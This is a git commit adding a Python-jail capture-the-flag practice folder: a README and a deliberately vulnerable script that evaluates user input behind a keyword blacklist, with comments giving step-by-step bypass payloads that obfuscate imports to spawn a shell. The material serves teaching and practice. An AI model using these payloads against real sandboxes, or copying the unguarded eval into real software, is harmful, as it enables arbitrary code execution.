b0b247eef8804860f09e45d3473160a033cc6ce8
Always Trying To Be Better <103570217+FTN-Dev@users.noreply.github.com>
2025-06-09 21:10:53 +0700

    pyjail

---
+++ MerdekaSiber_pyjail/iceberg/aboveTheSurface/keywordbans/README.md
@@ -0,0 +1,30 @@
+# Explanation
+ok, so at the first, we had short blacklist, and that was the main function of the __RoadtoShell__ payload
+
+
+```
+blacklist = ['__import__', '__system__', 'sh', 'os']
+```
+
+So, at the first, lets focus on the string things, __os__ and __sh__
+
+If u remember, in python, we can just plus the string from
+
+```
+__import__('os').system('sh')
+```
+to
+```
+__import__('o'+'s').system('s'+'h') 
+```
+
+Second, lets fix the **__import__** and **__system__**
+
+so we can change the function using strings, using the builtins function
+
+```
+__getattribute__()
+```
+
+u can see the image below, its just the same
+<img src="img/blacklistmodel1-1.png"> 
---
+++ MerdekaSiber_pyjail/iceberg/aboveTheSurface/keywordbans/blacklistmodel1.py
@@ -0,0 +1,24 @@
+expr = input("Put syntax to get shell: \n; ")
+blacklist = ['__import__', '__system__', 'sh', 'os']
+
+for char in blacklist:
+    if char in expr:
+        print(f"U cant use \"{char}\"")
+        exit()
+eval(expr)
+
+# default syntax untuk mendapatkan shell seperti dibawah ini
+# __import__('os').system('sh')
+
+# problem dan solusi 1:
+# string + string 
+# __import__('os').system('sh') MENJADI __import__('o'+'s').system('s'+'h') 
+
+# problem dan solusi 2:
+# __import__ dan system juga ikut terkena blacklist
+# maka caranya adalah menggunakan builtins function yaitu __getattribute__ untuk memanggil system sebagai string
+# __import__('o'+'s').system('s'+'h') MENJADI __import__('o'+'s').__getattribute__('sys'+'tem')('s'+'h')
+
+# problem dan solusi 3:
+# __import__ juga ikut diblacklist, tapi jika import tiba-tiba diubah __getattribute__ juga tidak bisa, maka kita panggil dulu __builtins__ kemudian baru __getattribute__
+# __import__('o'+'s').__getattribute__('sys'+'tem')('s'+'h') MENJADI __builtins__.__getattribute__('__imp'+'ort__')('o'+'s').__getattribute__('sys'+'tem')('s'+'h')
